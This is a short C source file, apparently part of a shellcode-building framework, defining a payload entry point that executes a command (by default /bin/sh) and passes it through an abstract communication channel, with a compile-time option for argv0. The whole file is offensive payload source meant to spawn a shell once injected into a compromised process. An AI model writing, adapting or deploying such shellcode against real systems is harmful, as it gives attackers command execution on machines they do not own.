#include <factory.h>

#include "helpers/channel.c"
#include "helpers/process.c"

#ifndef COMMAND
#define COMMAND /bin/sh
#endif

SHELLCODE_ENTRY {

    /* Command to execute. */
    const char *cmd = TO_STRING(COMMAND);

    /* No environment defined. */
    char **const envp = NULL;

#if (SET_ARGV0 == 1)
    char *const argv[] = { (char *) cmd, NULL };
#else
    char **const argv = envp;
#endif

    Channel channel;
    execute(cmd, argv, envp, channel);

} SHELLCODE_END
